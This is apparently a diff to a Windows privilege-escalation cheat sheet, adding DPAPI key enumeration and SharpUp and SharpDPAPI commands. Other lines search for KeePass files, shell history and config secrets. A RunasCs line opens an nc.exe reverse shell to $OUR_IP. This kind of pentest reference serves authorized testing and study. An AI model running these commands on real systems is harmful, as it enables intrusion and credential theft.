@@ -45,7 +45,7 @@ Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion
 
 # Check dotnet version
-Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release
+gci 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release
 
 # Check running processes
 Get-Process | Sort-Object Id
@@ -53,23 +53,27 @@ Get-Process | Select-Object Id, ProcessName, Path | Sort-Object Id
 
 # Enumerate user directories
 tree C:\Users /a /f
-Get-ChildItem -Path C:\Users -Include ConsoleHost_history.txt -File -Force -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\Users -Include ConsoleHost_history.txt -File -Force -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
 # Check file permissions
 icacls $TARGET /c
 
 # Search for sensitive files
-Get-ChildItem -Path C:\xampp -Include my.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue    # KeePass database files
-Get-ChildItem -Path C:\ -Include .git -Directory -Recurse -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\xampp -Include my.ini -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue    # KeePass database files
+gci -Path C:\ -Include .git -Directory -Recurse -Force -ErrorAction SilentlyContinue
+gci -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
 
 # Check command history
 Get-History
-ls C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+dir C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+# Check DPAPI
+gci C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID -Force
+dir C:\Users\$USER\AppData\Local\Microsoft\Protect\$SID -Force
 
 # Check services
 Get-CimInstance -ClassName win32_service | Select ProcessId, Name, State, PathName | Sort-Object ProcessId | Where-Object {$_.State -like 'Running'}
@@ -98,6 +102,13 @@ cat tasks.txt | grep \.exe | grep -iv system32
 # RunasCs
 .\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0
 .\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0 --bypass-uac --logon-type 8
+
+# SharpUp
+.\SharpUp.exe audit
+
+# SharpDPAPI
+.\SharpDPAPI.exe triage
+.\SharpDPAPI.exe triage /password:$PASSWD
 ```
 
 ## Automated Tools
